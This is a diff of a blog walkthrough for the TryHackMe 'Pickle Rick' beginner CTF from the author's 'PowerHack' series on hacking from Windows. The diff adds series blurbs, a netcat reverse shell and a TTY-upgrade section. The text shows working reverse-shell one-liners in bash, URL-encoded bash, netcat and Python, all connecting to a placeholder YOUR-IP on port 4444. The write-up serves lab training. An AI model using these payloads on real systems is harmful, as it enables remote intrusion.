@@ -7,9 +7,14 @@ tags: [TryHackMe, CTF, PowerHack, Windows, PowerShell, Enumeration, ReverseShell
 image: /assets/img/pickle-rick/rickandmorty.jpg
 ---
 
-![Pickle Rick Start Page](/assets/img/pickle-rick/start-page.png)
+> 💻 **PowerHack Series**  
+This write-up is part of my *PowerHack* series — a personal initiative to solve [TryHackMe CTFs](https://tryhackme.com/hacktivities/challenges) using only **Windows-based tools**.  
+From PowerShell to WSL, I'm proving that ethical hacking can be done effectively without leaving your Windows workstation.
 
-> **Room Summary**: A Rick and Morty-themed beginner CTF on TryHackMe. Your mission is to help Rick transform back into a human by finding 3 secret ingredients scattered throughout the system.
+
+![Pickle Rick Start Page](/assets/img/powerhack.png)
+
+> **Room Summary**: A Rick and Morty-themed beginner CTF on [TryHackMe](https://tryhackme.com/room/picklerick). Your mission is to help Rick transform back into a human by finding 3 secret ingredients scattered throughout the system.
 
 ---
 
@@ -145,16 +150,24 @@ ncat.exe -lvnp 4444
 
 ## Step 2: Execute Payload
 Try Bash reverse shell:
+
 ```bash
 bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
 ```
 
 If blocked, **URL encode** the payload:
+
 ```bash
 bash%20-i%20%3E%26%20/dev/tcp/YOUR-IP/4444%200%3E%261
 ```
+Or if that fails
+
+```bash
+nc YOUR-IP 4444 -e /bin/bash
+```
 
 Or use Python:
+
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash"])'
 ```
@@ -238,6 +251,39 @@ www-data@ip-10-10-81-100:/$
 > 🎯 **All 3 ingredients** recovered successfully!
 
 ---
+# 🔄 Bonus: Upgrade to Full TTY for Better Shell Experience
+
+From inside your reverse shell:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Then, press:
+```bash
+CTRL-Z
+```
+
+In your terminal:
+
+```bash
+stty raw -echo; fg
+```
+
+Press Enter, then:
+
+```bash
+export TERM=xterm
+clear
+```
+
+Now you get:
+
+- Tab completion
+- CTRL+C
+- Better prompt
+
+---
 
 # ✅ Completion Summary
 
@@ -253,5 +299,9 @@ By completing this room, you practiced:
 > 💡 PowerHack Tip: Always automate your recon and test multiple reverse shell payloads using PowerShell scripts!
 
 ---
+---
+> 🔚 **Part of the PowerHack Series**  
+This walkthrough is one of many in my journey to hack from Windows.  
+Check out more write-ups, tips, and tools at [krikas-sec.github.io](https://krikas-sec.github.io) or follow my updates on [GitHub](https://github.com/Krikas-Sec).
 
 Thanks for following this walkthrough — welcome to the **PowerHack** community 🚀
